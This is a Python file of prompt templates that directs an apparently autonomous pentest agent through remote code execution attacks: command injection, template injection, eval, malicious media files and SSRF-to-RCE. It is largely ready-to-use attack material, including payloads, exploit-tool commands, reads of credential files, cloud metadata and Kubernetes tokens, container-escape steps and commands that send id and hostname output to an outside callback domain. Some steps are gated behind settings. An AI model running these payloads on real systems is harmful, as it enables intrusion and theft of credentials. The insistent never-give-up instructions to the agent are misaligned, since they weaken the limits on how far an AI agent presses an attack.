"""
RedAmon Remote Code Execution (RCE) Prompts

Black-box workflows for RCE testing across the six classic primitives:
command injection, server-side template injection (SSTI), insecure deserialization,
dynamic eval / expression languages, media + document pipeline RCE, and SSRF-to-RCE.

Synthesis:
- Strix rce.md: taxonomy, payload matrices, evasion, post-exploitation pivots
- Shannon vuln-injection.txt + exploit-injection.txt: OWASP exploitation stages
  (Confirmation -> Fingerprinting -> Exfiltration -> Critical Impact), proof
  levels 1-4, false-positive gate. White-box / source-code / deliverable-file
  instructions are intentionally stripped -- RedAmon agents have no source access.
"""


# =============================================================================
# RCE MAIN WORKFLOW (.format()-templated; uses {{ }} for literal braces)
# =============================================================================

RCE_TOOLS = """
## ATTACK SKILL: REMOTE CODE EXECUTION (RCE)

**CRITICAL: This attack skill has been CLASSIFIED as Remote Code Execution.**
**You MUST follow the RCE workflow below. Do NOT switch to other attack methods.**

This skill covers the SIX classic RCE primitives:
1. OS command injection (shell wrappers, argument injection)
2. Server-side template injection (SSTI) -- Jinja2, Twig, Freemarker, Velocity, EJS, Thymeleaf
3. Insecure deserialization -- Java, .NET, PHP, Python, Ruby
4. Dynamic eval / expression languages -- OGNL, SpEL, MVEL, EL, JS eval, Python exec
5. Media + document pipelines -- ImageMagick, Ghostscript, ExifTool, LaTeX, ffmpeg
6. SSRF-to-RCE chains -- gopher://, FastCGI, Redis, internal admin UIs

**TOOLING (avoids self-inflicted failures):** SSTI / eval / injection payloads are
full of shell- and URL-hostile characters (`{{ }} $ ' " ; | ( ) < >` and template
braces). Send them with `execute_code` (Python `requests`, exact string) rather
than raw `execute_curl`, so the payload reaches the app INTACT instead of being
mangled by shell quoting or URL parsing. If you do use curl, single-quote the URL
and rely on the wrapper's globbing-off; but `execute_code` is the reliable path
for brace/quote-heavy payloads.

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
OOB blind-RCE callbacks (interactsh):    {rce_oob_callback_enabled}
Deserialization gadgets (ysoserial):     {rce_deserialization_enabled}
Aggressive payloads (file write / shell):{rce_aggressive_payloads}
```

**Hard rules:**
- Test ONE parameter at a time. Spray-and-pray triggers WAFs and burns the engagement.
- Establish a QUIET ORACLE (timing or OOB) BEFORE noisy payloads. A single
  `;sleep 1` confirms execution; `;sleep 30` looks like a DoS attempt.
- NEVER deploy a persistent web shell, modify cron, or write to web roots unless
  `RCE_AGGRESSIVE_PAYLOADS` is True. Read-only proofs (`id`, `whoami`, `cat /etc/passwd`)
  are sufficient to demonstrate impact.
- Default to OOB DNS oracle when available -- it has the lowest target footprint.
- Treat WAF-encoded errors and 500s as data points, NOT proof. Proof requires a
  controlled output you can correlate to your input.
- A framework DEBUG CONSOLE reached from an error/traceback page (a Werkzeug/Flask
  debugger with EVALEX, a Rails web-console, a Symfony profiler, a Django debug
  page, a Spring Boot actuator) is a POSSIBLE RCE avenue but is very often an
  UNINTENDED deployment artifact rather than the planted vulnerability -- and it is
  usually gated by a numeric PIN, a signed token, or a secret. Give such a console
  ONE bounded, evidence-driven unlock attempt, then GATE it: if it stays locked, if
  its auth/unlock endpoint reports `exhausted` / `locked` / rate-limited, or if the
  gating secret cannot be derived from what the target actually leaks, DECLARE IT A
  DEAD END and pivot back to the application's OWN request-handling surface -- the
  parameters, headers, cookies, request bodies, and uploads it processes, and whatever
  it parses or evaluates. Do NOT burn
  the engagement grinding PIN candidates, brute-forcing a signing secret, or forging
  sessions for a console you cannot unlock -- that is a classic way a solvable target
  runs out the clock. The intended sink almost always lives in the app's own logic,
  not in a debug wrapper; an unreachable console is one dead avenue, never the reason
  to stop testing the rest of the surface.
- BEFORE YOU GIVE UP, WRITE A "FINAL SUMMARY", OR CALL `complete` ON AN UNSOLVED TARGET -- run
  this blocking self-check; skipping it is the single most common way a SOLVABLE eval/template
  target is thrown away. (a) If you EVER saw your input evaluated or rendered server-side even
  once -- a math result, an object repr, ANY reflected value that changed when your payload
  changed -- then you HAVE a confirmed sink, and you may NOT stop, summarize, or declare defeat
  until the SCRIPTED object-graph BFS has run to exhaustion from that sink (every root object,
  PUBLIC attributes AND integer indices, depth at least 5, every leaf grepped for the objective).
  A give-up written while that traversal queue is unfinished is FORBIDDEN -- go run the sweep
  instead. (b) If you never confirmed a sink, you have not proven absence, you have merely not
  finished DISCOVERY: you MUST first run the full engine-identification matrix (a non-49 `7*7` is
  Jinja-only and rules out NOTHING -- confirm with an object/variable-reflection probe) and
  mechanically drive any multi-step / stateful flow all the way to its rendered artifact before
  concluding "not reflected". Only once BOTH branches are genuinely on record in your transcript
  may you report a target as unsolved. Running low on iterations is a reason to SCRIPT the
  remaining sweep in one harness, never a reason to stop early with the queue unfinished.

---

## MANDATORY RCE WORKFLOW

### Step 1: Reuse recon (query_graph, <5s)

Before crafting any payload, pull what recon already discovered:

```cypher
MATCH (e:Endpoint) WHERE e.url CONTAINS '<target_host>' RETURN e.url, e.method LIMIT 50
MATCH (p:Parameter) WHERE p.endpoint CONTAINS '<target_host>' RETURN p.name, p.location, p.endpoint LIMIT 100
MATCH (t:Technology) WHERE t.host CONTAINS '<target_host>' RETURN t.name, t.version
MATCH (h:Host {{ip:'<target_ip>'}})-[:RUNS]->(s:Service) RETURN s.port, s.product, s.version
```

The Technology node is critical -- it tells you which RCE primitive to prioritize:
- Java / Spring / Struts / WebLogic -> deserialization, OGNL/SpEL
- PHP / Laravel / WordPress / Drupal -> unserialize, command_exec wrappers
- Python / Flask / Django / Jinja2 -> SSTI, pickle, subprocess
- Node.js / Express / Next.js -> eval, template engines (EJS/Pug), child_process
- Ruby / Rails -> ERB SSTI, Marshal.load, system()
- .NET / ASP.NET -> ViewState, BinaryFormatter, MVEL

If the graph has parameter and tech data, skip discovery and jump to Step 3 with a
ranked sink list. If the graph is sparse, do Step 2 first.

**After Step 1, request `transition_phase` to exploitation before proceeding.**

### Step 2: Surface candidate sinks (execute_curl + execute_playwright)

Map the request surface to the six primitives. For each parameter found in recon
or rendered by the page, classify its likely sink class:

```
execute_curl({{"args": "-s -i 'http://TARGET/path?param=test'"}})
execute_playwright({{"url": "http://TARGET/path", "format": "html"}})
```

Look for:
- **CMD candidates:** params named `cmd`, `host`, `ip`, `addr`, `domain`, `url`,
  `target`, `file`, `name`, `path`, `query`, `q`, `lookup`, `ping`, `dns`, `exec`,
  `run`, `action`. Endpoints like `/diagnostic`, `/ping`, `/lookup`, `/admin/run`.
- **SSTI candidates:** params reflected in HTML, especially in error pages, email
  templates, or PDF generators. Look for `?name=`, `?greeting=`, `?subject=`,
  `?template=`, file conversion endpoints.
- **Deserialization candidates:** cookies/headers ending in `=` (base64), Java
  ViewState, ASP.NET `__VIEWSTATE`, PHP serialized blobs (`O:` or `a:` prefix),
  Python pickle markers (`\\x80\\x04`).
- **Media-pipeline candidates:** any file upload accepting images/PDFs/SVG.
  Check what runs on the backend: `Server`/`X-Powered-By` headers,
  ImageMagick / GraphicsMagick / Ghostscript / LibreOffice fingerprints.
- **SSRF -> RCE candidates:** any param consuming a URL (`url=`, `redirect=`,
  `callback=`, `webhook=`, `image_url=`, `xmlrpc.php`, fetch/proxy endpoints).

### Step 3: Establish a quiet oracle (BEFORE noisy payloads)

This step is non-negotiable. You cannot prove RCE without a deterministic oracle.
Pick the LEAST noisy oracle that fits the channel:

**Option A -- Time-based gate (no infrastructure needed)**

For each candidate parameter, send a baseline GET, measure time, then a 1-2s gated
delay payload, measure again:

```
execute_curl({{"args": "-s -o /dev/null -w '%{{time_total}}\\\\n' 'http://TARGET/path?param=test'"}})
execute_curl({{"args": "-s -o /dev/null -w '%{{time_total}}\\\\n' 'http://TARGET/path?param=test%3Bsleep%201'"}})
```

A consistent ~1s delta vs baseline = command injection confirmed (Level 1 proof).
Repeat with `;sleep 2` to rule out network jitter. Stop at 2s -- never go above 5s.

Time-based payloads by OS:
- Unix: `;sleep 1`, `` `sleep 1` ``, `$(sleep 1)`, `||sleep 1`, `&&sleep 1`
- Windows CMD: `& timeout /t 2 &`, `& ping -n 2 127.0.0.1 &`
- Windows PS: `; Start-Sleep -s 2 ;`

**Option B -- OOB DNS oracle (CONDITIONAL on `RCE_OOB_CALLBACK_ENABLED`=True)**

If OOB callbacks are enabled in settings, follow the **OOB / Blind RCE Workflow**
section below to register an interactsh domain. OOB beats time-based because it
proves outbound capability AND command execution in one shot, with zero noise.

**Option C -- Output-based (when input is reflected)**

If the parameter is reflected in the response, inject a token-producing command
and grep for it:

```
execute_curl({{"args": "-s 'http://TARGET/path?param=test%3Bid'"}})
```

Look for `uid=` in the response. This is the strongest proof: it gives you uid+gid
context for free.

### Step 4: Confirm exactly ONE primitive (OWASP Stage 1: Confirmation)

You MUST reach Level 1 proof (oracle confirmed) on ONE primitive before moving on.
Do not attempt multiple primitives in parallel -- the WAF will fingerprint and block you.

#### 4A. Command injection (most common, try first)

Tool: **commix** (already in kali_shell). Best for fast first-pass automation.

```
kali_shell({{"command": "commix -u 'http://TARGET/path?param=test*' --batch --level=2 --technique=tcfo --time-sec=2"}})
```

`*` marks the injection point. Techniques: `t`=time, `c`=classic, `f`=file-write,
`o`=output. Stop at `level=2` initially; only escalate to 3 if WAF blocks 1-2.

For POST data:
```
kali_shell({{"command": "commix -u 'http://TARGET/submit' --data='name=test*&csrf=ABC' --batch --level=2"}})
```

For headers (User-Agent, Cookie, Referer):
```
kali_shell({{"command": "commix -u 'http://TARGET/' --headers='User-Agent: Mozilla/5.0*' --batch"}})
```

If commix detects injection, capture the technique and the captured shell context
(uid, hostname). Move to Step 5 (fingerprinting).

If commix fails BUT your manual time-based oracle (Step 3A) succeeded, the WAF is
likely blocking commix's payload format. Drop to manual `execute_curl` payloads
from `RCE Payload Reference` -> "Command Injection".

#### 4B. SSTI (when parameter is reflected and tech is template-driven)

Tool: **sstimap** (already in kali_shell). Auto-detects 17 template engines.

```
kali_shell({{"command": "sstimap -u 'http://TARGET/path?param=*' --crawl 0"}})
```

For POST:
```
kali_shell({{"command": "sstimap -u 'http://TARGET/submit' --data 'name=*' -X POST"}})
```

If sstimap reports an engine + injection point, take the suggested PoC and re-run
manually via execute_curl to capture the exact payload form.

If sstimap fails but you suspect SSTI (param reflected in HTML, framework hints
present), drop to manual probes. Fingerprint the ENGINE first -- there is NO
universal SSTI oracle:

- **Arithmetic-evaluating engines** (Jinja2, Twig, Freemarker, Velocity, ERB,
  Smarty, Mako) evaluate a math probe to `49` (Jinja2 `{{{{7*7}}}}`, Freemarker
  `${{7*7}}`, ERB `<%= 7*7 %>`). Math evaluating -> SSTI confirmed.
- **When template DELIMITER characters are FILTERED (`{{` `}}` `%` `$` `<` `>` rejected --
  e.g. a `400`/"forbidden characters" the instant you send one):** a blocked delimiter is
  NOT evidence of "no SSTI," and it is NOT a reason to abandon the parameter or fall back
  to SQLi/other classes. Consider that your input may land INSIDE a template construct the
  application ALREADY wrote, where the engine's delimiters already surround the injection
  point -- in which case you must NOT add your own delimiters at all. Test that hypothesis
  DELIMITER-FREE: send a bare, neutral expression -- a simple arithmetic or boolean
  placeholder such as `A op B` -- that contains NONE of the filtered characters, alongside
  a plain-literal control, and DIFF THE WHOLE RESPONSE between them: body content,
  structure, length, status code, error text, and timing. ANY difference that tracks the
  COMPUTED value rather than the characters you typed is evidence the input was evaluated;
  do not assume the effect surfaces in any one place -- inspect the entire response and its
  shape, not a single field. Confirm on the exact sink/URL/method you will exploit. Only
  after a delimiter-free bare probe is ALSO inert there may you write the endpoint off.
  Filtered delimiters mean "try delimiter-free," never "give up on the vector."
- **Logic-less / sandboxed engines** (Django templates, Handlebars, Mustache,
  Liquid, Go text/template) do NOT compute `7*7`; they render empty, echo it, or
  raise a template error the app may swallow into a blank page/redirect. A probe
  that does NOT return `49` is therefore NOT evidence of "not SSTI" -- it may be
  the WRONG probe for THIS engine. Confirm these by the engine's own variable/tag
  facility: render something the engine exposes and diff against a control (e.g.
  Django `{{% debug %}}`, but ONLY when `DEBUG=True` and the debug context processor
  is on -- on a production app it renders nothing). What a confirmed injection yields
  is engine- and target-dependent -- sometimes code execution, sometimes only data
  already in scope. Both are valid outcomes; pursue whichever the engine and objective
  actually allow. Do not assume a readable secret is present, and do not assume RCE is
  reachable.
  **MANDATORY positive canary before you ever write off a sandboxed sink.** An inert
  arithmetic probe (the 7*7 probe not returning 49) proves NOTHING on these engines, so do NOT
  stop there and do NOT default to it. To decide eval-vs-no-eval you MUST render something
  GUARANTEED to be in scope and inspect HOW it comes back: pick a root object your recon shows
  the context exposes (in most web frameworks the request object is always present), render it
  BARE, and read the output. If it returns as an OBJECT / structure repr (a type name, an
  address, a container's contents) the expression WAS evaluated -> sink CONFIRMED; if your exact
  source text returns verbatim (your delimiters echoed unchanged) it was not. Run this positive
  object-render canary on the SAME sink/URL/method you will exploit, and run it BEFORE ever
  concluding "renders literally / not a sink." Never let an arithmetic-only probe -- or a value
  echoed on some OTHER page -- stand in for this check. Only after this positive canary is inert
  on the exact sink may you move on from it.
  See "Logic-less / sandboxed engines" in `RCE Payload Reference`.
- **Oracle discipline -- SSTI confirmation is MONOTONIC.** The MOMENT any probe returns a
  positive evaluation signal on a sink -- an engine object rendered as its repr (a framework
  request/response/session/config object printing as its `<... object ...>` form), a computed
  arithmetic result, or a context variable resolving to its value -- that sink is CONFIRMED
  injectable: record it and move to extraction on THAT sink. A LATER probe that renders empty
  or inert (an engine comment that strips to nothing, a tag/char the filter removed, a payload
  the sandbox silently ignores) is AMBIGUOUS: empty output is NOT proof of "no evaluation," and
  it MUST NOT retract, downgrade, or "rule out" a sink that already produced a positive. Do not
  let an inert probe talk you out of a sink that has evaluated. And ALWAYS run the oracle on the
  EXACT sink/URL/method you will exploit -- a literal render on one page (e.g. a value echoed
  verbatim elsewhere) says nothing about a different endpoint that compiles the value as a
  template; never generalize a "no eval" verdict across sinks.
- **Sink commitment -- do NOT diffuse across sinks.** Once ONE sink is CONFIRMED (per the
  oracle above), STOP hunting for other injection points and EXTRACT from that sink to
  exhaustion first -- only one working sink is ever needed, and finding "no eval" on other
  parameters/pages/endpoints is NOT progress. From the confirmed sink, run the object-graph
  walk as a SYSTEMATIC breadth-first sweep, not scattered one-off guesses:
    1. list every ROOT object the render exposes by printing each one;
    2. for each, print its PUBLIC attribute / index names (dump the object, read what it shows);
    3. breadth-first, descend ONE public hop and print the result, diffing each;
    4. QUEUE any child that looks like configuration, secret, cryptographic, serializer, or
       storage/connection state for a deeper hop;
    5. keep a written list of which object.path you have already expanded, so you never re-walk
       one and never quit while the queue is non-empty;
    6. continue until the target datum (a signing key, a config value, a credential, the flag)
       surfaces. You have NOT exhausted a confirmed sink until every reachable public path is
       printed -- do not abandon it to go re-hunt sinks.
- **Deferred / stateful sinks:** the render may happen on a LATER request than
  the one you inject on (welcome/confirmation pages, generated emails/PDFs,
  dynamically-built JS/CSS, multi-step wizards). Carry the session forward and
  drive the ENTIRE flow to its rendered artifact before concluding "not
  reflected." For a directly-reflected sink you can conclude from the injection
  response itself; but where the sink COULD be stateful/deferred, absence of
  reflection on the injection request alone does not rule SSTI out.
  - **Drive stateful/multi-step flows mechanically:** use a SESSION-PERSISTING client
    (`execute_code` with a python requests.Session / cookie jar), NOT independent one-off
    `execute_curl` calls -- every step depends on the cookies and CSRF/anti-forgery token
    the previous step set. Before each step's POST, re-fetch that step's page and re-extract
    the FRESH token plus any hidden/state-carrying fields from its HTML, then submit. A step
    that keeps "redirecting back to the start" means server-side state was lost: fix the
    session/cookie/token handling -- do NOT conclude the flow is unreachable and abandon the
    vector. This tooling failure is the single most common reason a real stateful SSTI is
    wrongly written off.
  - **Seed-then-render:** when the value you control is STORED at one step and re-rendered at
    another, place the payload in the EARLIEST field that gets stored (expect input filters
    THERE), then request the LATER view that re-renders it -- the injection fires, and your
    proof appears, on the RE-RENDER request (often a GET), not on the step you submitted to.
    Enumerate every view/method that could re-render a stored value.
- **GATE -- a confirmed sink of ONE class does NOT close the other classes on the SAME
  input; finish the stored-render matrix before you downgrade.** One input can be several
  sinks at once. Observing that a value is reflected in a browser-executable context (an
  HTML/JS reflection -- an XSS sink) does NOT establish that it is "only" XSS: the identical
  stored value can ALSO be compiled by a server-side template engine, deserialized, or
  concatenated into a query. It is a recurring, run-losing mistake to let a client-side (or
  any other) positive TALK YOU OUT OF a server-side-injection hypothesis on the same value --
  they are not mutually exclusive, and confirming one is not evidence against another. You may
  NOT reclassify a value as "just XSS / not a template sink" or move off it until the
  STORED-RENDER MATRIX below has come back inert on EVERY downstream view:
    1. Seed a positive object-render canary (render a root object the context exposes and read
       its repr -- NOT an arithmetic-only probe, which proves nothing on sandboxed engines) in
       the EARLIEST field where the value is stored.
    2. Then request EVERY downstream view that could re-render that stored value -- the
       follow-up/confirmation view, any profile/summary/detail page, generated artifacts
       (emails/PDFs/exports), and a fresh re-GET of the same step -- NOT only the immediate
       response to the request you submitted on.
    3. Diff EACH rendered view against a control seed for an evaluation signal.
  Absence of evaluation on the submission response alone is NOT a negative; on stateful/
  deferred sinks the render is routinely deferred to a later view. Only after the FULL matrix
  is inert on every downstream view may you drop the template-injection hypothesis for that
  input. Record which views you fetched; "it looked like XSS" is not grounds to skip the matrix.

#### 4B-bis. Filter / WAF bypass for character-restricted template sinks

A confirmed template sink often sits behind an INPUT blacklist and/or an OUTPUT check.
Do NOT conclude "SSTI is dead" because your first canonical payload is rejected -- the
engine is still compiling your input; you only need syntax that AVOIDS the blocked
tokens. Work it as a constraint-satisfaction problem, not a fixed recipe:

1. **Map the constraint first (measure, never guess).** Probe each structural
   metacharacter in isolation (`{{{{`, `}}}}`, `{{%`, `%}}`, `_`, `.`, `[`, `]`, `|`, `(`,
   `'`, `"`, `~`) and record which ones the app rejects and with what message. Note any
   OUTPUT validation too (e.g. the reflected field must stay numeric or match a regex).
   You now know EXACTLY which syntax you must route around -- discovered from the target,
   never assumed.
2. **Output braces (`{{{{ }}}}`) blocked -> emit another way.** Expression braces are only
   ONE way an engine produces output. If they are filtered, obtain output via:
   - a statement/tag construct the engine still renders (Jinja/Twig `{{% ... %}}`,
     ERB `<% ... %>`), combined with SHADOWING a variable the template already emits on
     its own -- reassign that in-scope name so the template's OWN output expression
     carries your value out;
   - an engine debug/dump tag, or an error-based leak (force your value into an exception
     message the app echoes back);
   - a stored-then-rendered field (see 4B "seed-then-render") whose LATER view emits it.
3. **Dot (`.`) blocked -> attribute access without dots.** Use the engine's attribute
   filter (`|attr('NAME')`) or its map/lookup helpers instead of dotted access.
4. **Subscript (`[` `]`) blocked -> index without brackets.** Reach items via
   `|attr('...')(k)` forms, `|first`/`|last`/`|map`/`|list` filters, slicing helpers, or
   methods reached through the attribute filter.
5. **Underscore (`_`) blocked -> build reserved names without a literal `_`.** Compose the
   character from a string escape or concatenation the engine evaluates (hex/unicode
   escapes inside a string literal, `~`-concatenation, `chr()`-style helpers) so the
   blocked byte never appears in your INPUT while the engine still resolves the name.
6. **Satisfy the OUTPUT check.** If the reflected field is validated, keep THAT field
   compliant (e.g. leave it numeric) and route your real output to a DIFFERENT part of
   the response -- a shadowed variable, a second injected field, or an error string --
   so the check passes while your data still lands in the body.

Every concrete gadget above is a PLACEHOLDER: the exact global/object, the exact escape,
and the exact emit path are target-specific -- derive them from step 1's constraint map
and the engine's own object graph (the 4B breadth-first extraction walk), never from a
memorised payload. A blacklist that blocks the "textbook" chain is a signal to enumerate
the SURVIVING syntax, not to abandon the class.

#### 4C. Insecure deserialization (CONDITIONAL on `RCE_DESERIALIZATION_ENABLED`)

Only if `RCE_DESERIALIZATION_ENABLED`=True AND you identified a deserialization
candidate in Step 2. Follow the **Deserialization Workflow** section below.

#### 4D. Eval / expression-language

Less common but high-impact. Probe pattern (URL-encoded as needed):

```
?expr=1%2B1                                        -> reflects 2 = arithmetic eval
?expr=__import__('os').popen('id').read()          -> Python eval/exec
?expr=Runtime.getRuntime().exec('id')              -> Java OGNL/SpEL
?lang=javascript&code=process.mainModule.require('child_process').execSync('id')
                                                    -> Node.js vm/eval
```

Confirm via output reflection or OOB.

#### 4E. Media-pipeline RCE (only when file upload exists)

Generate a malicious file, upload via execute_curl multipart, observe processing:

```
# ImageMagick MSL/MVG (legacy ImageTragick variants)
kali_shell({{"command": "printf 'push graphic-context\\\\nfill \\\\\\"url(https://OOB_DOMAIN/x)\\\\\\"\\\\npop graphic-context\\\\n' > /tmp/exploit.mvg"}})
# upload exploit.mvg through the file-upload endpoint, watch interactsh

# Ghostscript via PDF (-dSAFER bypass on old versions)
# craft PostScript with %pipe%id file operator; trigger on PDF/PS conversion

# ExifTool DjVu CVE-2021-22204
# generate via execute_code: PoC exists in PoC-in-GitHub for the CVE

# LaTeX shell-escape (when --shell-escape is enabled)
kali_shell({{"command": "echo '\\\\\\\\immediate\\\\\\\\write18{{id > /tmp/o}}' > /tmp/exploit.tex"}})
```

Trigger the conversion via the upload endpoint, then check OOB for callback.

#### 4F. SSRF to RCE chain

When you already have SSRF (or detect it during Step 4 probing), pivot to RCE
through internal services. Most reliable chains:

```
# php-fpm via gopher:// (use Gopherus to build FCGI records)
kali_shell({{"command": "gopherus --exploit fastcgi /var/www/html/index.php"}})

# Redis via gopher:// (cron write or RDB module load)
kali_shell({{"command": "gopherus --exploit redis"}})

# Reach internal Jenkins script console / Spring Actuator /actuator/jolokia or /env
# /actuator/env (Spring Cloud) -> set spring.cloud.bootstrap.location to attacker URL
```

### Step 5: Fingerprint the execution context (OWASP Stage 2)

Once Step 4 produces Level 1 oracle proof, characterize WHAT you're executing as.
Run a one-shot enumeration in the same primitive that succeeded:

```
;id;uname -a;whoami;pwd;cat /etc/os-release;cat /proc/1/cgroup 2>/dev/null;ls -la /.dockerenv 2>/dev/null;echo END
```

Capture (Level 2 proof = Query Structure Manipulated):
- **Identity:** uid, gid, supplementary groups
- **Host:** kernel, distro, hostname
- **Filesystem:** cwd, $HOME, $PATH
- **Containerization:** `/.dockerenv` exists? `/proc/1/cgroup` mentions docker/kubepods?
- **Service account token (k8s):** `/var/run/secrets/kubernetes.io/serviceaccount/token` readable?

For Windows targets:
```
& whoami /all & systeminfo & net user & ipconfig /all & dir C:\\\\Users
```

If output is too large or quotes corrupt the response, base64-encode:

```
;(id;uname -a;whoami;pwd) | base64
```

Decode the response server-side via Python (`base64 -d`) to read.

### Step 6: Demonstrate impact (OWASP Stage 3: Targeted Exfiltration)

Read-only proofs (always allowed):

```
;cat /etc/passwd | head -20
;cat /etc/hostname
;cat /var/lib/secrets/* 2>/dev/null | head -50      # k8s mounted secrets
;env | grep -iE 'aws|key|token|secret|pass' | head
;cat /proc/self/environ | tr '\\\\0' '\\\\n' | head
;cat /var/run/secrets/kubernetes.io/serviceaccount/token   # k8s SA token
;curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS metadata
;curl -s -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure
;curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token   # GCP
```

Stop here unless `RCE_AGGRESSIVE_PAYLOADS`=True. The above is enough for a Level 3
proof (Data Extraction Proven) and a critical-severity finding.

### Step 7: Critical impact (OWASP Stage 4) -- AGGRESSIVE PAYLOADS

{rce_aggressive_block}

### Step 8: Long-running exploitation (commix/sstimap >120s)

When commix or sstimap exceeds 120s, run in background and poll:

```
kali_shell({{"command": "commix -u 'http://TARGET/path?param=test*' --batch --level=3 > /tmp/commix.log 2>&1 & echo $!"}})
kali_shell({{"command": "tail -50 /tmp/commix.log"}})
kali_shell({{"command": "ps -p SAVED_PID >/dev/null && echo RUNNING || echo DONE"}})
```

### Step 9: Reporting requirements

The final report MUST contain:
- **Sink class** (one of: command_injection / SSTI / deserialization / eval / media_pipeline / ssrf_to_rce)
- **Primitive** (e.g. `;sleep 1` shell-metachar, Jinja2 math probe, PHP `O:` unserialize)
- **Oracle used** (timing / OOB DNS / output reflection)
- **Level reached** (1=injection point, 2=structure controlled, 3=data extracted, 4=critical impact)
- **Execution context** (uid, hostname, container/host, OS)
- **Exact reproducer** (full URL or curl command, payload encoded as actually sent)
- **Impact statement** (data accessed, lateral pivots possible, container escape feasibility)
- **Defenses observed** (WAF model + bypass technique used; SELinux/AppArmor; capabilities)

### Proof Levels (Shannon-derived rigor framework)

| Level | Evidence | Classification |
|-------|----------|----------------|
| 1 | Oracle fired (timing delta / OOB ping / reflected output) | POTENTIAL (low conf) |
| 2 | Identity context captured (uid, hostname) | POTENTIAL (med conf) |
| 3 | File read / sensitive data extracted | EXPLOITED |
| 4 | Cred theft, lateral movement, or container escape | EXPLOITED (CRITICAL) |

A finding below Level 3 with NO bypass attempts is a **FALSE POSITIVE** -- do NOT
report it. Only report Level 3+ as exploited; Level 1-2 with documented external
blockers (auth, infra) report as POTENTIAL.

### False positive gate

Before classifying a finding, verify:
- Did the oracle fire CONSISTENTLY across at least 3 attempts? (Single firings can
  be load spikes, not your payload.)
- Is the response derived from the executed command (output, timing) or could it
  be a static error / WAF block message?
- For timing oracles: is the delta both REPRODUCIBLE and clearly above the target's
  OWN measured jitter? Measure baseline variance first -- a few hundred ms can be pure
  noise on a slow/proxied target, while a `sleep 5` should stand out far beyond it.
  Judge against the observed noise floor, not a fixed cutoff, and prefer a longer sleep
  to separate signal from jitter when the margin is tight.
- For SSTI on an arithmetic-evaluating engine: did `7*7` produce 49 (or `7*'7'`
  produce string repetition)? Just reflecting the literal probe text is NOT SSTI
  -- the engine must evaluate it. But do NOT invert this into "no 49 means no
  SSTI": on a logic-less/sandboxed engine (Django templates, Handlebars,
  Mustache, Liquid, Go) `7*7` never computes, yet a rendered context variable or
  a `{{% debug %}}`-style context dump straight from the engine IS confirmed SSTI
  (data disclosure). Confirm by the engine's own facility, and drive stateful
  sinks to their deferred render before declaring the class dead.
"""


# =============================================================================
# AGGRESSIVE-PAYLOADS BLOCK (interpolated as a value into RCE_TOOLS, not formatted)
# =============================================================================

RCE_AGGRESSIVE_DISABLED = """**DISABLED** by project setting `RCE_AGGRESSIVE_PAYLOADS=False`.

Stop at Step 6 (read-only proofs). Do NOT:
- Write any file outside /tmp/
- Drop persistent web shells, cron, systemd, or service-restart hooks
- Run reverse shell payloads
- Modify any application file or database row
- Attempt container escape (mount manipulations, capability abuse)

If the engagement requires a Level 4 critical-impact proof, the operator must
explicitly enable `RCE_AGGRESSIVE_PAYLOADS` in project settings."""


RCE_AGGRESSIVE_ENABLED = """**ENABLED** by project setting `RCE_AGGRESSIVE_PAYLOADS=True`.

Critical-impact proofs (Level 4). Pick the MINIMUM viable proof; do not chain.

**File write under app constraints:**
```
;echo 'PROOF_WRITE_REDAMON' > /tmp/rce_proof_$$
;ls -la /tmp/rce_proof_*
```

**Reverse shell (only if explicitly requested by operator):**
- Generate via `msfvenom` in kali_shell, host via chisel/ngrok if behind NAT
- Use `set ExitOnSession false` so the handler stays available
- IMMEDIATELY take a screenshot of `id;uname -a;hostname` from the shell, then
  background it. Do NOT explore filesystem or move laterally without authorization.

**Container escape attempts (only if /.dockerenv or /proc/1/cgroup confirms container):**

```
# Mounted docker.sock (most common escape)
;ls -la /var/run/docker.sock
;curl --unix-socket /var/run/docker.sock http://localhost/containers/json
# If accessible -> container compromise via API

# CAP_SYS_ADMIN + cgroup release_agent (CVE-style)
;capsh --print 2>/dev/null | grep cap_sys_admin
# If present -> document as escape-feasible; do NOT execute the cgroup trick
# without explicit authorization

# k8s service account API access
;TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
;curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

**Privilege escalation enumeration (Linux):**
```
;sudo -l 2>/dev/null
;find / -perm -4000 -type f 2>/dev/null | head -30   # SUID
;getcap -r / 2>/dev/null | head -30                   # capabilities
;cat /etc/crontab; ls -la /etc/cron.*/
```

Cross-reference findings against GTFOBins (in the agent's KB via web_search) for
known privesc paths.

**Cleanup obligation (MANDATORY):**
- Remove every file you wrote to the target. Confirm removal with `ls -la`.
- Do NOT leave reverse-shell handlers, exposed tunnels, or cron entries behind.
- Document each artifact created and confirmed removed in the final report."""


# =============================================================================
# OOB / BLIND RCE WORKFLOW (appended raw, NOT format-templated; single braces)
# =============================================================================

RCE_OOB_WORKFLOW = """
## OOB / Blind RCE Workflow (interactsh DNS+HTTP callbacks)

**Use this when:** the target does not reflect command output (blind), the WAF
blocks inline output, or you want a near-zero-noise oracle. Requires
`interactsh-client` (already in kali_shell).

---

### Step 1: Start interactsh-client as a background process

```
kali_shell({"command": "interactsh-client -server oast.fun -json -v > /tmp/interactsh.log 2>&1 & echo $!"})
```

**Save the PID** for later cleanup.

### Step 2: Read the registered callback domain

```
kali_shell({"command": "sleep 5 && head -20 /tmp/interactsh.log"})
```

Look for the `.oast.fun` domain (e.g. `abc123xyz.oast.fun`). This is your
**REGISTERED_DOMAIN**. It is cryptographically tied to the running client --
random subdomains will NOT route back.

> `oast.fun` is the DEFAULT public interactsh server. If the project configured a
> different OOB provider or a self-hosted interactsh, pass that host to `-server`
> instead. Against an egress-restricted target no callback arrives -- treat that as
> INCONCLUSIVE, not proof the vector is dead.

### Step 3: Inject OOB payloads pointing at REGISTERED_DOMAIN

**Unix DNS exfil (works ONLY where the target can make outbound DNS queries -- egress-filtered / air-gapped / no-resolver targets never call back, so silence here is INCONCLUSIVE, not proof of no RCE):**
```
;nslookup `id`.REGISTERED_DOMAIN
;dig +short `whoami`.REGISTERED_DOMAIN
;ping -c 1 `hostname`.REGISTERED_DOMAIN
```

**HTTP exfil (richer payload, requires outbound 80/443):**
```
;curl http://REGISTERED_DOMAIN/`hostname`
;wget -q http://REGISTERED_DOMAIN/$(id|base64 -w0) -O /dev/null
```

**Windows variants:**
```
& nslookup %USERNAME%.REGISTERED_DOMAIN &
